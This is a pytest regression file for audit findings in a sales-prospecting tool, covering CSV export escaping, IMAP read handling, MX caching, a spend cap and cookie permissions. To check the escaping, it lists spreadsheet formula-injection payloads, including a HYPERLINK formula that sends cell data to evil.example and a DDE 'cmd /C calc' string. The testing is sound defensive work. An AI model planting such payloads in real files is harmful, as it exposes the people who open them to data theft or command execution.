"""Regressions for audit findings 11-18 (build-docs/AUDIT.md, second pass).

One test per finding, named after it. Every hostile value here is the kind a
scraped website really can contain.
"""

import os
import sys

import pytest

from sellbird.export import to_csv
from sellbird.integrations.email_finder import MXUnavailable
from sellbird.textio import csv_cell


# ── 11. a scraped name must not run as a spreadsheet formula ──

@pytest.mark.parametrize("hostile", [
    '=HYPERLINK("https://evil.example/?x="&A1,"Invoice")',
    '=cmd|\' /C calc\'!A0',
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
    "  =1+1",          # leading space, still a formula to Excel
])
def test_a_formula_from_a_website_is_neutralised(hostile):
    assert csv_cell(hostile).startswith("'")


@pytest.mark.parametrize("ordinary", [
    "Acme Roofing", "O'Brien & Sons", "3M", "jane@example.com",
    "Head of Ops, EMEA", "", "a-b",          # a dash mid-string is not a formula
])
def test_ordinary_text_is_left_alone(ordinary):
    assert csv_cell(ordinary) == ordinary


def test_numbers_stay_numbers():
    assert csv_cell(88) == 88
    assert csv_cell(1.5) == 1.5
    assert csv_cell(None) == ""


def test_the_prospect_export_escapes_every_scraped_column():
    """Finding 11: this is the export the README tells users to open."""
    row = {
        "email": "dana@example.com",
        "first_name": "=1+1",
        "last_name": "@x",
        "company_name": '=HYPERLINK("https://evil.example","Click")',
        "title": "-2+3",
        "industry": "+7",
        "personalization": "=cmd|' /C calc'!A0",
        "score": 90,
    }
    line = to_csv([row]).splitlines()[1]
    # Every hostile cell is quoted into harmlessness...
    for hostile in ("=1+1", "@x", "-2+3", "+7"):
        assert f",'{hostile}" in line or f"'{hostile}," in line or f"\"'{hostile}" in line
    # ...and nothing in the row still begins a cell with a formula character.
    import csv as _csv
    import io
    cells = next(_csv.reader(io.StringIO(line)))
    assert not [c for c in cells if c[:1] in ("=", "+", "-", "@")]


def test_the_company_register_still_escapes_too():
    """It always did; the shared helper must not have lost it."""
    from sellbird.register import to_csv as register_csv
    line = register_csv([{"company": "=1+1"}]).splitlines()[1]
    assert line.startswith("'=1+1") or "'=1+1" in line


# ── 12 and 16. the SMTP read must not consume the inbox ──

class FakeIMAP:
    """Just enough IMAP to show what the fetch does and doesn't flag."""

    def __init__(self, messages):
        self.messages = messages           # {id: raw bytes}
        self.seen: set[bytes] = set()
        self.fetched: list[str] = []
        self.logged_out = False

    def login(self, user, password):
        return "OK", []

    def select(self, mailbox):
        return "OK", []

    def search(self, charset, *criteria):
        unseen = b" ".join(i for i in self.messages if i not in self.seen)
        return "OK", [unseen]

    def fetch(self, msg_id, parts):
        self.fetched.append(parts)
        if "PEEK" not in parts:
            self.seen.add(msg_id)          # what a bare RFC822 fetch does
        return "OK", [(b"1 (RFC822 {1})", self.messages[msg_id])]

    def store(self, ids, command, flags):
        if command == "+FLAGS" and "Seen" in flags:
            for one in ids.split(b","):
                self.seen.add(one)
        return "OK", []

    def logout(self):
        self.logged_out = True


def _raw(subject="Re: quick question", message_id="<a@example.com>", date="Mon, 24 Nov 2026 10:00:00 +0000"):
    head = f"From: Dana <dana@example.com>\nTo: me@example.com\nSubject: {subject}\nDate: {date}\n"
    if message_id:
        head += f"Message-ID: {message_id}\n"
    return (head + "\nSure, tell me more.\n").encode()


def _provider(monkeypatch, imap):
    from sellbird.integrations.smtp_mail import SmtpImapProvider

    class Env:
        smtp_host = "smtp.example.com"
        smtp_port = 587
        smtp_username = "me@example.com"
        smtp_password = "pw"
        imap_host = "imap.example.com"
        imap_port = 993
        imap_username = ""
        imap_password = ""

    class Cfg:
        class persona:
            name = "Me"
            email = "me@example.com"

    monkeypatch.setattr("imaplib.IMAP4_SSL", lambda host, port: imap)
    return SmtpImapProvider(Cfg(), Env())


def test_reading_the_inbox_does_not_mark_it_read(monkeypatch):
    """Finding 12: the read must not consume the message."""
    imap = FakeIMAP({b"1": _raw()})
    provider = _provider(monkeypatch, imap)

    first = provider._fetch_unseen(50)
    assert len(first) == 1
    assert any("PEEK" in parts for parts in imap.fetched)
    assert imap.seen == set()                 # nothing flagged yet

    # The Handler could not handle it (Claude down) and never confirmed, so
    # the next cycle must see it again.
    assert len(provider._fetch_unseen(50)) == 1


def test_confirming_the_read_is_what_marks_it_read(monkeypatch):
    imap = FakeIMAP({b"1": _raw()})
    provider = _provider(monkeypatch, imap)

    assert len(provider._fetch_unseen(50)) == 1
    provider.confirm_read()
    assert imap.seen == {b"1"}
    # Now it is out of the unseen set, as it should be.
    assert provider._fetch_unseen(50) == []


def test_confirming_twice_is_harmless(monkeypatch):
    imap = FakeIMAP({b"1": _raw()})
    provider = _provider(monkeypatch, imap)
    provider._fetch_unseen(50)
    provider.confirm_read()
    provider.confirm_read()         # no pending ids: must not raise
    assert imap.seen == {b"1"}


def test_a_failure_to_mark_read_never_raises(monkeypatch):
    """The messages were handled; dedup covers a re-read. Losing the loop to
    an IMAP hiccup here would be worse than reading one twice."""
    imap = FakeIMAP({b"1": _raw()})
    provider = _provider(monkeypatch, imap)
    provider._fetch_unseen(50)

    def boom(*_a, **_k):
        raise OSError("connection reset")
    imap.store = boom

    provider.confirm_read()         # must not raise


@pytest.mark.asyncio
async def test_imap_login_failure_raises_so_sending_holds(monkeypatch):
    """Returning [] here read as "no replies", so follow-ups kept going to
    people who had replied. Gmail and Graph raise; SMTP must too."""
    import imaplib
    imap = FakeIMAP({b"1": _raw()})

    def refuse(user, password):
        raise imaplib.IMAP4.error("[AUTHENTICATIONFAILED] Invalid credentials")
    imap.login = refuse
    provider = _provider(monkeypatch, imap)
    with pytest.raises(imaplib.IMAP4.error, match="AUTHENTICATIONFAILED"):
        await provider.get_replies()
    assert imap.logged_out


@pytest.mark.asyncio
async def test_imap_unreachable_raises(monkeypatch):
    provider = _provider(monkeypatch, FakeIMAP({}))

    def unreachable(host, port):
        raise OSError("connection refused")
    monkeypatch.setattr("imaplib.IMAP4_SSL", unreachable)
    with pytest.raises(OSError):
        await provider.get_replies()


@pytest.mark.parametrize("step", ["select", "search", "fetch"])
def test_imap_refused_step_raises_instead_of_a_partial_read(monkeypatch, step):
    imap = FakeIMAP({b"1": _raw()})
    setattr(imap, step, lambda *_a, **_k: ("NO", [b"refused"]))
    provider = _provider(monkeypatch, imap)
    with pytest.raises(Exception, match="couldn't"):
        provider._fetch_unseen(50)
    provider.confirm_read()
    assert imap.seen == set()          # nothing marked read on a failed read


def test_imap_message_expunged_after_search_is_skipped(monkeypatch):
    imap = FakeIMAP({b"1": _raw(), b"2": _raw(message_id="<b@example.com>")})
    real_fetch = imap.fetch
    imap.fetch = lambda msg_id, parts: ("OK", [None]) if msg_id == b"1" else real_fetch(msg_id, parts)
    provider = _provider(monkeypatch, imap)
    assert [m.message_id for m in provider._fetch_unseen(50)] == ["<b@example.com>"]


@pytest.mark.asyncio
async def test_handler_treats_an_imap_failure_as_a_failed_read(monkeypatch, tmp_path):
    """End to end: the handler reports the read failed, which holds sending."""
    import imaplib
    from sellbird.state import StateManager
    from tests.test_outbox_native import make_handler
    state = StateManager(str(tmp_path / "imap.db"))
    await state.init_db()
    imap = FakeIMAP({})

    def refuse(user, password):
        raise imaplib.IMAP4.error("[AUTHENTICATIONFAILED] Invalid credentials")
    imap.login = refuse
    handler = make_handler(state, _provider(monkeypatch, imap))
    assert await handler._run_native() is False
    assert "AUTHENTICATIONFAILED" in handler.last_read_problem


def test_two_replies_in_one_thread_without_message_ids_stay_distinct(monkeypatch):
    """Finding 16: "{sender}:{subject}" collided, so the second was dropped —
    and the second message is usually the one that says yes."""
    imap = FakeIMAP({
        b"1": _raw(message_id="", date="Mon, 24 Nov 2026 10:00:00 +0000"),
        b"2": _raw(message_id="", date="Mon, 24 Nov 2026 11:00:00 +0000"),
    })
    provider = _provider(monkeypatch, imap)
    messages = provider._fetch_unseen(50)
    assert len(messages) == 2
    assert messages[0].provider_id != messages[1].provider_id


# ── 13. a DNS blip must not write a prospect off ──

@pytest.mark.asyncio
async def test_a_failed_mx_lookup_is_a_guess_not_an_invalid_address(monkeypatch):
    """Finding 13: "invalid" is terminal, so it must mean "we asked and there
    is no mail server", never "we could not ask"."""
    from sellbird.integrations import email_finder as ef

    async def unavailable(domain):
        raise MXUnavailable("MX lookup for acme.example failed: timed out")
    monkeypatch.setattr(ef, "get_mx_host", unavailable)

    result = await ef.find_email("Dana", "Doe", "acme.example", state=None)
    assert result.status == "guess"
    assert result.email == "dana.doe@acme.example"


@pytest.mark.asyncio
async def test_a_domain_with_genuinely_no_mx_is_still_invalid(monkeypatch):
    """The other half of the distinction, so the fix didn't just soften it."""
    from sellbird.integrations import email_finder as ef

    async def no_mx(domain):
        return None
    monkeypatch.setattr(ef, "get_mx_host", no_mx)

    result = await ef.find_email("Dana", "Doe", "acme.example", state=None)
    assert result.status == "invalid"
    assert result.mx_type == "none"


@pytest.mark.asyncio
async def test_a_lookup_failure_is_never_cached(monkeypatch):
    """A remembered failure is what made one blip permanent."""
    import dns.resolver

    from sellbird.integrations import email_finder as ef

    ef._mx_cache.clear()
    calls = []

    def resolve(domain, kind):
        calls.append(domain)
        raise dns.resolver.LifetimeTimeout("timed out")
    monkeypatch.setattr(dns.resolver, "resolve", resolve)

    for _ in range(3):
        with pytest.raises(MXUnavailable):
            await ef.get_mx_host("acme.example")
    assert len(calls) == 3                  # asked every time, not remembered
    assert "acme.example" not in ef._mx_cache


@pytest.mark.asyncio
async def test_a_real_no_answer_is_cached(monkeypatch):
    """A real answer is worth remembering, which is the point of the cache."""
    import dns.resolver

    from sellbird.integrations import email_finder as ef

    ef._mx_cache.clear()
    calls = []

    def resolve(domain, kind):
        calls.append(domain)
        raise dns.resolver.NoAnswer()
    monkeypatch.setattr(dns.resolver, "resolve", resolve)

    assert await ef.get_mx_host("acme.example") is None
    assert await ef.get_mx_host("acme.example") is None
    assert len(calls) == 1
    ef._mx_cache.clear()


# ── 15 and 18. the spend cap ──

def test_the_cost_parser_survives_a_malformed_number():
    """Finding 18: a bad `cost` used to raise inside fetch and be recorded
    as 0.0, understating the spend the budget check relies on."""
    from sellbird.collectors.discover import _as_float

    assert _as_float("0.372") == 0.372
    assert _as_float(2) == 2.0
    for junk in (None, "", "n/a", {}, [], "1,5"):
        assert _as_float(junk) == 0.0
    assert _as_float(junk := "nope", 9.0) == 9.0 and junk


@pytest.mark.asyncio
async def test_a_provider_that_bills_over_its_estimate_is_stopped_at_the_cap(
        tmp_path, monkeypatch):
    """Finding 15: --max-spend is documented as a hard cap.

    The run-level estimate already bounds a run whose estimates are honest.
    The gap was a provider that bills more than it estimated: the old check
    looked at what had already been spent, so it only noticed after the
    money was gone. Here each query is estimated at $0.10 and really costs
    $0.40, so an unbounded run would spend $1.20 against a $1.00 cap.
    """
    from sellbird.collectors import discover as dsc

    calls = []

    class UnderEstimating(dsc.DiscoveryProvider):
        key = "fake"
        label = "Fake"

        def estimate(self, queries):
            return 0.10 * len(queries)      # honest-looking, and wrong

        async def fetch(self, client, env, query):
            calls.append(query)
            self.last_cost = 0.40           # what it actually bills
            return []

    monkeypatch.setitem(dsc.PROVIDERS, "fake", UnderEstimating())

    from sellbird.state import StateManager
    state = StateManager(str(tmp_path / "t.db"))
    await state.init_db()
    await state.upsert_signal_code("TEST_SIGNAL", label="t", description="d",
                                   cost_note="free", status="confirmed")

    queries = [dsc.DiscoveryQuery(term="roofing", location="Denver, CO")
               for _ in range(10)]

    class Cfg:
        class icp:
            industries = ["roofing"]
            geography = ["Denver, CO"]
            keyword_variants = {}
            geo_coordinates = {}

    report = await dsc.run_discovery(state, Cfg(), provider_key="fake",
                                     queries=queries, max_spend=1.0)

    assert report.actual_cost <= 1.0, f"spent ${report.actual_cost} against a $1.00 cap"
    assert len(calls) == 2          # two at $0.40; a third would cross
    assert "cap" in (report.stopped or "")


@pytest.mark.asyncio
async def test_an_honest_provider_still_runs_every_query(tmp_path, monkeypatch):
    """The cap must not become a brake on a run that fits inside it."""
    from sellbird.collectors import discover as dsc

    calls = []

    class Honest(dsc.DiscoveryProvider):
        key = "fake2"
        label = "Fake"

        def estimate(self, queries):
            return 0.01 * len(queries)

        async def fetch(self, client, env, query):
            calls.append(query)
            self.last_cost = 0.01
            return []

    monkeypatch.setitem(dsc.PROVIDERS, "fake2", Honest())

    from sellbird.state import StateManager
    state = StateManager(str(tmp_path / "t.db"))
    await state.init_db()
    await state.upsert_signal_code("TEST_SIGNAL", label="t", description="d",
                                   cost_note="free", status="confirmed")

    queries = [dsc.DiscoveryQuery(term="roofing", location="Denver, CO")
               for _ in range(10)]

    class Cfg:
        class icp:
            industries = ["roofing"]
            geography = ["Denver, CO"]
            keyword_variants = {}
            geo_coordinates = {}

    report = await dsc.run_discovery(state, Cfg(), provider_key="fake2",
                                     queries=queries, max_spend=1.0)
    assert len(calls) == 10
    assert not report.stopped


# ── 17. cookie permissions ──

@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX mode bits mean nothing on Windows (see dashboard_auth)")
def test_linkedin_cookies_are_never_world_readable(tmp_path, monkeypatch):
    """Finding 17: write-then-chmod leaves a readable window."""
    from sellbird.integrations import linkedin as li

    monkeypatch.setattr(li, "COOKIES_PATH", tmp_path / "linkedin_cookies.json")
    automation = li.LinkedInAutomation.__new__(li.LinkedInAutomation)
    li.LinkedInAutomation._save_cookies_sync(automation, [{"name": "li_at", "value": "x"}])

    mode = os.stat(li.COOKIES_PATH).st_mode & 0o777
    assert mode == 0o600, oct(mode)
    # Rewriting works: the cookie jar is saved on every shutdown.
    li.LinkedInAutomation._save_cookies_sync(automation, [{"name": "li_at", "value": "y"}])
    assert os.stat(li.COOKIES_PATH).st_mode & 0o777 == 0o600


# ── 14. the documentation must not contradict the code ──

def test_claude_md_does_not_claim_linkedin_is_never_read():
    """Finding 14: the repo ships a LinkedIn scraper, so the flat claim that
    Sellbird never reads LinkedIn was untrue."""
    from pathlib import Path

    text = Path("CLAUDE.md").read_text(encoding="utf-8")
    assert "or LinkedIn (their terms" not in text
    # ...and it says what enabling it actually costs.
    assert "against" in text and "LinkedIn's terms" in text
    assert "never enable it for the user" in text
